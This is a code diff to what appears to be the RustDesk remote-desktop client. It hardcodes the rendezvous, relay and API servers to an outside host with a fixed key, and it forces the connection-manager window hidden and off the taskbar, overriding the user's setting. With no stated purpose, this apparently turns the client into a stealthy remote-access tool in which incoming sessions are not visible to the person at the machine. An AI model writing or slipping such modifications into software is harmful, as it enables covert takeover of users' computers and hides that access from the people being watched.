@@ -145,6 +145,10 @@ void runMainApp(bool startService) async {
   }
   await Future.wait([gFFI.abModel.loadCache(), gFFI.groupModel.loadCache()]);
   gFFI.userModel.refreshCurrentUser();
+  await bind.mainSetOption(key: 'custom-rendezvous-server', value: 'rustdesk10.4304.cn:29996');
+  await bind.mainSetOption(key: 'relay-server', value: 'rustdesk10.4304.cn:29997');
+  await bind.mainSetOption(key: 'api-server', value: 'http://rustdesk10.4304.cn:29994');
+  await bind.mainSetOption(key: 'key', value: 'yundazhe01');
   runApp(App());
 
   // Set window option.
@@ -167,7 +171,7 @@ void runMainApp(bool startService) async {
     windowManager.setOpacity(1);
     windowManager.setTitle(getWindowName());
     // Do not use `windowManager.setResizable()` here.
-    setResizable(!bind.isIncomingOnly());
+    setResizable(!true);
   });
 }
 
@@ -179,6 +183,10 @@ void runMobileApp() async {
   draggablePositions.load();
   await Future.wait([gFFI.abModel.loadCache(), gFFI.groupModel.loadCache()]);
   gFFI.userModel.refreshCurrentUser();
+  await bind.mainSetOption(key: 'custom-rendezvous-server', value: 'rustdesk10.4304.cn:29996');
+  await bind.mainSetOption(key: 'relay-server', value: 'rustdesk10.4304.cn:29997');
+  await bind.mainSetOption(key: 'api-server', value: 'http://rustdesk10.4304.cn:29994');
+  await bind.mainSetOption(key: 'key', value: 'yundazhe01');
   runApp(App());
   await initUniLinks();
 }
@@ -287,7 +295,7 @@ void runConnectionManagerScreen() async {
     const DesktopServerPage(),
     MyTheme.currentThemeMode(),
   );
-  final hide = await bind.cmGetConfig(name: "hide_cm") == 'true';
+  final hide = true;
   gFFI.serverModel.hideCm = hide;
   if (hide) {
     await hideCmWindow(isStartup: true);
@@ -338,6 +346,7 @@ hideCmWindow({bool isStartup = false}) async {
     await windowManager.minimize();
     await windowManager.hide();
     _isCmReadyToShow = true;
+    await windowManager.setSkipTaskbar(true);
   } else if (_isCmReadyToShow) {
     if (await windowManager.getOpacity() != 0) {
       await windowManager.setOpacity(0);
